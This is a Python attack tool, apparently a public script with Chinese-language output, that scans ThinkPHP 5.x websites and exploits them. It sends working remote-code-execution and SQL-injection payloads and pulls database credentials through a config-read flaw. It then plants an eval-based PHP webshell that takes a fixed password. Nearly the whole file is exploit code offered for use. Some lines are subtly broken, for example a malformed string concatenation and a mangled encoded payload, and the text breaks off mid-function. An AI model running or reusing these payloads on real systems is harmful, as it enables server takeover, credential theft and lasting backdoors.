# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup
import re
import argparse
import time
from urllib.parse import urlparse



image = """
██╗ ██████╗███████╗██████╗ ███████╗██████╗  ██████╗       ███╗   ██╗
██║██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝       ████╗  ██║
██║██║     █████╗  ██████╔╝█████╗  ██████╔╝██║  ███╗█████╗██╔██╗ ██║
██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════╝██║╚██╗██║
██║╚██████╗███████╗██████╔╝███████╗██║  ██║╚██████╔╝      ██║ ╚████║          

thinkphp5.x所有版本的漏洞检测、利用、写shell                        
如遇到exp或写shell失败,请手工尝试!
干就完了兄弟们!!!
                                                         --code-by  iceberg-N                 
"""

headers = {
        'Content-Type': "application/x-www-form-urlencoded",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    }



#参数解析
def argparser():
    parser = argparse.ArgumentParser(description='该工具集合thinkphp5.x所有版本的漏洞检测、利用、写shell于一体,如遇到exp或写shell失败,请手工尝试!')
    parser.add_argument('-u', help='目标url')
    parser.add_argument('-c', type=str, help="命令执行")
    parser.add_argument('-w', nargs='?', const=1, help="写入webshell")
    parser.add_argument('-f', help="读取文件")
    args = parser.parse_args()
    return args


# 解析url
class ParseUrl:

    def __init__(self):
        pass

    def parseurl(self, target):
        try:
            if re.match(r'https://', target) == None:
                url = urlparse(target)
                hostname = url.hostname
                port = url.port
                target = "http://" + hostname + ":" + str(port)
                return target
            else:
                return target
            # res = requests.get(target, headers=headers)
            # if res.status_code == 200:
            #     return target
            # elif res.status_code == 302 or res.status_code == 301:
            #     target = res.headers['location']
            #     url = urlparse(target)
            #     hostname = url.hostname
            #     port = url.port
            #     target = "http://" + hostname + ":" + str(port)
            #     return target
            # else:
            #     target = "https://" + hostname + ":" + str(port)
            #     res = requests.get(target, headers=headers)
            #     if res.status_code == 200:
            #         return target
            #     elif res.status_code == 302:
            #         pass

            # if re.match(r'.*\?', target):
            #     parse = re.findall(r'http.*?\?', target)
            #     parse = ''.join(parse).strip('?')
            #     return parse
            # else:
            #     return target
        except Exception as e:
            print("[-] url格式错误!")

# 检测是否有该漏洞

class Check:

    def __init__(self, url):
        self.url = url
        self.checkresult = {}

    def exec(self):
        self.check_url()
        return self.checkresult

    # 遍历打payload
    def check_url(self):
        check_method = [
            "check_5_x_route_rce",
            "check_5_0_x_db",
            "check_5_x_construct_rce",
            "check_5_x_construct_other",
            "check_5_x_sql",
            "check_5_x_xff_sql",
            "check_5_x_time_sql",
            "check_5_x_driver_rce",
            "check_5_x_showid_rce",
            "check_5_x_request_input_rce",
            "check_5_x_template_driver_rce",
            "check_5_x_cache_rce",
            "check_5_x_ids_sql",
            "check_5_x_orderid_sql",
            "check_5_x_update_sql"

        ]
        for method in check_method:
            if method == "check_5_x_route_rce":
                self.check_5_x_route_rce_get()
            elif method == "check_5_0_x_db":
                self.check_5_0_x_db()
            elif method == "check_5_x_construct_rce":
                self.check_5_x_construct_rce()
            elif method == "check_5_x_construct_other":
                self.check_5_x_construct_other()
            elif method == "check_5_x_sql":
                self.check_5_x_sql()
            elif method == "check_5_x_xff_sql":
                self.check_5_x_xff_sql()
            elif method == "check_5_x_time_sql":
                self.check_5_x_time_sql()
            # elif method == "check_5_x_driver_rce":
            #     self.check_5_x_driver_rce()
            elif method == "check_5_x_showid_rce":
                self.check_5_x_showid_rce()
            elif method == "check_5_x_request_input_rce":
                self.check_5_x_request_input_rce()
            elif method == "check_5_x_template_driver_rce":
                self.check_5_x_template_driver_rce()
            elif method == "check_5_x_cache_rce":
                self.check_5_x_cache_rce()
            elif method == "check_5_x_ids_sql":
                self.check_5_x_ids_sql()
            elif method == "check_5_x_orderid_sql":
                self.check_5_x_orderid_sql()
            elif method == "check_5_x_update_sql":
                self.check_5_x_update_sql()

    # thinkphp5.0.x路由过滤不严谨rce漏洞
    def check_5_x_route_rce_get(self):
        pocs = [
            "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

        ]
        checkresult = {}
        # proxy = {
        #     "http":"127.0.0.1:8080"
        # }

        try:
            for poc in pocs:
                payload = self.url + "/index.php" + poc
                res = requests.get(payload, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                print(verify)
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_route_rce_get"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5.0.x路由过滤不严谨rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)

    def check_5_x_construct_rce(self):
        try:
            checkresult = {}
            pocs = [
                "_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
                "s=1&_method=__construct&method=POST&filter[]=phpinfo",
                "aaaa=1&_method=__construct&method=GET&filter[]=phpinfo",
                "c=phpinfo&f=1&_method=filter",
                "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1"
            ]
            poc_url = self.url + "/index.php?s=index"
            for poc in pocs:
                res = requests.post(poc_url, data=poc, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_construct_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5.x路由过滤不严谨rce漏洞(post型)\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    # def check_5_x_driver_rce(self):
    #     pocs = [
    #         "?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>",
    #         "?s=index/\\think\\view\\driver\\Php/display&content=<?php phpinfo();?>"
    #     ]
    #     checkresult = {}
    #     try:
    #         for poc in pocs:
    #             payload = self.url + poc
    #             res = requests.get(payload, headers=headers)
    #             bs = BeautifulSoup(res.text, 'html.parser')
    #             verify = bs.find_all('h1')
    #             for row in verify:
    #                 rows = re.match("PHP Version", row.text)
    #                 if rows != None:
    #                     self.poc = poc
    #                     self.poc_method = "tp5_driver_rce"
    #                     checkresult[self.poc_method] = self.poc
    #                     self.check_poc()
    #                     break
    #                 else:
    #                     continue
    #             if checkresult:
    #                 self.checkresult = {**self.checkresult, **checkresult}
    #                 break
    #         else:
    #             print("[-] {0} 不存在thinkphp5_driver_rce漏洞\n".format(self.url))
    #     except Exception as e:
    #         print("[-] 请求失败!\n")

    def check_5_x_showid_rce(self):
        pocs = [
            "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]"
        ]
        checkresult = {}
        try:
            for poc in pocs:
                payload = self.url + "/index.php" + poc
                res = requests.get(payload, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_showid_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5_showid_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_request_input_rce(self):
        pocs = [
            "?s=index/\\think\\Request/input&filter=phpinfo&data=1",
            "?s=index/think\\Request/input&filter=phpinfo&data=1"
        ]
        checkresult = {}
        try:
            for poc in pocs:
                payload = self.url + poc
                res = requests.get(payload, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_request_input_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5_request_input_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    # thinkphp5 __construct覆盖变量rce
    def check_5_x_construct_other(self):
        try:
            checkresult = {}
            pocs = [
                "_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
                "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
                "s=1&_method=__construct&method=POST&filter[]=phpinfo"
            ]
            poc_url = self.url + "/index.php?s=captcha"
            for poc in pocs:
                res = requests.post(poc_url, data=poc, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_construct_other"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5.x_captcha_rce漏洞(post型)\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_template_driver_rce(self):
        try:
            checkresult = {}
            pocs = [
                "?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>",
                "?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>"
            ]
            for poc in pocs:
                payload = self.url + "/index.php" + poc
                res = requests.get(payload, headers=headers)
                if res.status_code == 200:
                    host = urlparse(self.url).hostname + ":" + str(urlparse(self.url).port) + "/iceberg.php"
                    print(host)
                    res = requests.get(host, headers=headers)
                    if res.status_code == 200:
                        self.poc = poc
                        self.poc_method = "tp5_template_driver_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                else:
                    continue
            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_template_driver漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_lite_code_rce(self):
        pocs = [
            "/index.php/module/action/param1/${@print(var_dump(iceberg))}"
        ]
        checkresult = {}
        try:
            for poc in pocs:
                payload = self.url + poc
                res = requests.get(payload, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_lite_code_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5_lite_code_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_cache_rce(self):
        try:
            checkresult = {}
            pocs = [
                "%0d%0avar_dump('iceberg-N');%0d%0a//"
            ]
            poc_url = self.url + "/index.php/Home/Index/index.html"
            for poc in pocs:
                res = requests.post(poc_url, data=poc, headers=headers)
                if "iceberg-N" in res.text:
                    self.poc = poc
                    self.poc_method = "tp5_cache_rce"
                    checkresult[self.poc_method] = self.poc
                    self.check_poc()
                    break
                else:
                    continue

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_cache_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

        # thinkphp5.0.x数据库泄露
    def check_5_0_x_db(self):

        pocs = [
            "?s=index/think\\config/get&name=database.username",
            "?s=index/think\\config/get&name=database.password"
        ]
        try:
            payload_usr = self.url + pocs[0]
            payload_pwd = self.url + pocs[1]
            res_usr = requests.get(payload_usr, headers=headers)
            res_pwd = requests.get(payload_pwd, headers=headers)
            if res_usr.status_code == 200:
                self.dbusr = res_usr.text
                self.dbpwd = res_pwd.text
                self.poc = pocs[0]
                self.poc_method = "tp5_db"
                self.check_poc()
        except Exception as e:
            print("[-] 请求失败!\n")

    # thinkphp5sql注入漏洞
    def check_5_x_sql(self):

        try:
            checkresult = {}
            pocs = [
                "?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/HEX('iceberg')--+",
                "?ids[0,UpdAtexml(0,ConcAt(0xa,HEX('iceberg')),0)]=1"
            ]

            for poc in pocs:
                poc_url = self.url + poc
                res = requests.get(poc_url, headers=headers)
                bs = BeautifulSoup(res.text, 'html.parser')
                if r"69636562657267" in bs:
                    self.poc = poc
                    self.poc_method = "tp5_sql"
                    checkresult[self.poc_method] = self.poc
                    self.check_poc()
                    break
                else:
                    continue

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.xSQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)

    def check_5_x_xff_sql(self):
        try:
            checkresult = {}
            headers = {
                'Content-Type': "application/x-www-form-urlencoded",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
                'X-Forwarded-For': "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/HEX('iceberg'))))#"
            }
            self.headers = headers
            poc_url = self.url + "/index.php?s=/home/article/view_recent/name/1"
            res = requests.get(poc_url, headers=self.headers)
            bs = BeautifulSoup(res.text, 'html.parser')
            if "69636562657267" in bs:
                self.poc = "X-Forwarded-For: 1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/HEX('iceberg'))))#"
                self.poc_method = "tp5_xff_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.xXFF头SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_time_sql(self):
        try:
            checkresult = {}
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                "DNT": "1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Content-Type": "multipart/form-data; boundary=--------546983569",
                "Accept-Encoding": "gzip, deflate, sdch",
                "Accept-Language": "zh-CN,zh;q=0.8",
            }
            payload = "----------546983569\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(10)#\r\n\r\n----------546983569--"
            self.headers = headers
            poc_url = self.url + "/index.php?s=/home/user/checkcode/"
            start_time = time.time()
            res = requests.post(poc_url, data=payload, headers=self.headers)
            if time.time() - start_time  >= 10:
                self.poc = payload
                self.poc_method = "tp5_time_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x时间注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_ids_sql(self):
        try:
            checkresult = {}
            payload = "?ids[0,UpdAtexml(0,ConcAt(0xa,HEX(iceberg)),0)]=1"
            poc_url = self.url + "/index.php" + payload
            res = requests.get(poc_url, headers=headers)
            if "69636562657267" in res.text:
                self.poc = payload
                self.poc_method = "tp5_ids_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_ids_SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_orderid_sql(self):
        try:
            checkresult = {}
            payload = "?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/HEX('iceberg')--+"
            poc_url = self.url + "/index.php" + payload
            res = requests.get(poc_url, headers=headers)
            if "69636562657267" in res.text:
                self.poc = payload
                self.poc_method = "tp5_orderid_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_orderid_SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_update_sql(self):
        try:
            checkresult = {}
            payload = "?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20HEX('iceberg')),0x7e),1))"
            poc_url = self.url + "/index.php" + payload
            res = requests.get(poc_url, headers=headers)
            if "69636562657267" in res.text:
                self.poc = payload
                self.poc_method = "tp5_update_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_update_SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    # 输出存在漏洞及payload
    def check_poc(self):
        if self.poc_method == "tp5_route_rce_get":
            print("[+] {0} 存在thinkphp5.x路由过滤不严谨rce漏洞\npayload: {1}".format(self.url, self.url + self.poc))
        elif self.poc_method == "tp5_construct_rce":
            print("[+] {0} 存在thinkphp5.x__construct参数变量覆盖rce漏洞\npayload: POST ?s=index {1}".format(self.url, self.poc))
        # elif self.poc_method == "tp5_driver_rce":
        #     print("[+] {0} 存在thinkphp5.x_driver_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_construct_other":
            print("[+] {0} 存在thinkphp5.x路由过滤不严谨rce漏洞(post型)\npayload: POST ?s=captcha {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_showid_rce":
            print("[+] {0} 存在thinkphp5.x_showid_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_request_input_rce":
            print("[+] {0} 存在thinkphp5.x_request_input_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_cache_rce":
            print("[+] {0} 存在thinkphp5.x_cache_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_lite_code_rce":
            print("[+] {0} 存在thinkphp5.x_lite_code_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_db":
            print("[+] {0} 存在thinkphp5.0.x数据库泄露\npayload: {1}\n数据库用户名: {2}\n数据库密码: {3}".format(self.url, self.url + self.poc, self.dbusr, self.dbpwd))
        elif self.poc_method == "tp5_sql":
            print("[+] {0} 存在thinkphp5.xSQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_xff_sql":
            print("[+] {0} 存在thinkphp5.xXFF头SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_time_sql":
            print("[+] {0} 存在thinkphp5.x时间注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_template_driver_rce":
            print("[+] {0} 存在thinkphp5.x_template_driver_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_ids_sql":
            print("[+] {0} 存在thinkphp5.x_ids_SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_orderid_sql":
            print("[+] {0} 存在thinkphp5.x_orderid_SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_update_sql":
            print("[+] {0} 存在thinkphp5.x_update_SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        else:
            pass


class Exp:
# 命令执行
    def __init__(self, target, check, cmd):
        headers = {
            'Content-Type': "application/x-www-form-urlencoded",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
        }
        self.target = target
        self.check = check
        self.cmd = cmd
        self.headers = headers
    def check_exp(self):
        for method in list(self.check.keys()):
            if method == "tp5_route_rce_get":
                self.method = "tp5_route_rce_get"
                self.check_5_x_route_rce_get_exp()
                break
            elif method == "tp5_construct_rce":
                self.method = "tp5_construct_rce"
                self.check_5_x_construct_rce_exp()
                break
            elif method == "tp5_construct_other":
                self.method = "tp5_construct_other"
                self.check_5_x_construct_other_exp()
                break
            elif method == "tp5_driver_rce":
                self.method = "tp5_driver_rce"
                self.check_5_x_driver_rce_exp()
                break
            elif method == "tp5_showid_rce":
                self.method = "tp5_showid_rce"
                self.check_5_x_showid_rce_exp()
                break
            elif method == "tp5_lite_code_rce":
                self.method = "tp5_lite_code_rce"
                self.check_5_x_lite_code_rce_exp()
                break
            elif method == "tp5_cache_rce":
                self.method = "tp5_cache_rce"
                self.check_5_x_cache_rce_exp()
                break
            else:
                print("暂无可利用的poc!")

    def check_5_x_route_rce_get_exp(self):
        poc = self.check[self.method]
        if "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
            exp_code = self.target + "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
            res = requests.get(exp_code, headers=headers)
            print(res.text)
        elif "?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
            exp_code = self.target + "?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
            res = requests.get(exp_code, headers=headers)
            print(res.text)
        elif "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
            exp_code = self.target + "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
            res = requests.get(exp_code, headers=headers)
            print(res.text)
        elif "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
            exp_code = self.target + "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
            res = requests.get(exp_code, headers=headers)
            print(res.text)
        else:
            pass

    def check_5_x_construct_rce_exp(self):

        poc = self.check[self.method]
        if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
            exp_code = "_method=__construct&filter[]=system&method=GET&get[]={0}".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
            exp_code = "s={0}&_method=__construct&method=POST&filter[]=system".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        elif "aaaa=1&_method=__construct&method=GET&filter[]=phpinfo" == poc:
            exp_code = + "aaaa={0}&_method=__construct&method=GET&filter[]=system".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        elif "c=phpinfo&f=1&_method=filter" == poc:
            exp_code = "c=system&f={0}&_method=filter".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        elif "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1" == poc:
            exp_code = "_method=__construct&filter[]=system&server[REQUEST_METHOD]={0}".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        else:
            pass

    def check_5_x_construct_other_exp(self):

        poc = self.check[self.method]

        if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
            exp_code = "_method=__construct&filter[]=system&method=GET&get[]={0}".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        elif "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1" == poc:
            exp_code = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={0}".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
            exp_code = "s={0}&_method=__construct&method=POST&filter[]=system".format(self.cmd)
            res = requests.post(self.target, data=exp_code, headers=self.headers)
            print(res.text)
        else:
            pass

    def check_5_x_driver_rce_exp(self):

        poc = self.check[self.method]
        if "?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>" == poc:
            exp_code = self.target + "?s=index/think\\view\\driver\\Php/display&content=<?php system({0});?>".format(self.cmd)
            res = requests.get(exp_code, headers=self.headers)
            print(res.text)
        elif "?s=index/\\think\\view\\driver\\Php/display&content=<?php phpinfo();?>" == poc:
            exp_code = self.target + "?s=index/\\think\\view\\driver\\Php/display&content=<?php system({0});?>".format(self.cmd)
            res = requests.get(exp_code, headers=self.headers)
            print(res.text)

    def check_5_x_showid_rce_exp(self):
        poc = self.check[self.method]
        if "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]" == poc:
            exp_code = self.target + "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system({0})}]".format(self.cmd)
            res = requests.get(exp_code, headers=self.headers)
            print(res.text)

    def check_5_x_request_input_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "?s=index/\\think\\Request/input&filter=phpinfo&data=1" == poc:
                exp_code = self.target + "?s=index/\\think\\Request/input&filter=system&data={0}".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers)
                print(res.text)
            elif "?s=index/think\\Request/input&filter=phpinfo&data=1" == poc:
                exp_code = self.target + "?s=index/think\\Request/input&filter=system&data={0}".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers)
                print(res.text)
            else:
                print("[-]check_5_x_request_input_rce_exp利用失败")
        except Exception as e:
            print("利用异常!")

    def check_5_x_lite_code_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "/index.php/module/action/param1/${@print(var_dump(iceberg))}" == poc:
                exp_code = self.target + "?s=index/\\think\\Request/input&filter=system&data={0}".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers)
                print(res.text)
            else:
                print("[-]check_5_x_lite_code_rce_exp利用失败")
        except Exception as e:
            print("利用异常!")

    def check_5_x_cache_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "%0d%0avar_dump('iceberg-N');%0d%0a//" == poc:
                exp_code = "%0d%0system({0});%0d%0a//".format(self.cmd)
                poc_url = self.url + "/index.php/Home/Index/index.html"
                res = requests.post(poc_url, data=exp_code, headers=self.headers)
                print(res.text)
            else:
                print("[-]check_5_x_cache_rce_exp利用失败")
        except Exception as e:
            print("利用异常!")

    # def exp(self, exp_url, cmd):
    #     try:
    #         if "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == exp_url[1]:
    #             exp_code = exp_url[0] + "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(cmd)
    #         elif "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == exp_url[1]:
    #             exp_code = exp_url[0] + "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(cmd)
    #
    #         res = requests.get(exp_code, headers=headers)
    #         return res.text
    #
    #     except Exception as e:
    #         print("[-] 参数错误")

class Shell:

    def __init__(self, target, check):
        headers = {
            'Content-Type': "application/x-www-form-urlencoded",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
        }
        self.target = target
        self.check = check
        self.headers = headers
        self.webshell = "<?php @eval($_POST['iceberg']);?>"

    def check_shell(self):
        for method in list(self.check.keys()):
            if method == "tp5_construct_rce_get":
                self.method = "tp5_construct_rce"
                self.check_5_x_construct_rce_shell()
                break
            elif method == "tp5_construct_other":
                self.method = "tp5_construct_other"
                self.check_5_x_construct_other_shell()
                break
            elif method == "tp5_route_rce_get":
                self.method = "tp5_route_rce_get"
                self.check_5_x_route_rce_get_shell()
            elif method == "tp5_template_driver_rce":
                self.method = "tp5_template_driver_rce"
                self.check_5_x_template_driver_rce_shell()
            elif method == "tp5_showid_rce":
                self.method = "tp5_showid_rce"
                self.check_5_x_showid_rce_shell()
            elif method == "tp5_request_input_rce":
                self.method = "tp5_request_input_rce"
                self.check_5_x_request_input_rce_shell()
            elif method == "tp5_lite_code_rce":
                self.method = "tp5_lite_code_rce"
                self.check_5_x_lite_code_rce_shell()
            elif method == "tp5_cache_rce":
                self.method = "tp5_cache_rce"
                self.check_5_x_cache_rce_shell()
            else:
                print("[-] {0} 无法写入webshell!")

    def check_5_x_construct_rce_shell(self):
        poc = self.check[self.method]
        if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
            shell_code = "_method=__construct&filter[]=system&method=GET&get[]=echo '{0}'>iceberg.php".format(self.webshell)
            payload = self.target + "/index.php?s=index"
            requests.post(payload, data=shell_code , headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                shell_code = "_method=__construct&filter[]=assert&method=GET&get[]=file_put_contents('iceberg.php','{0}')".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
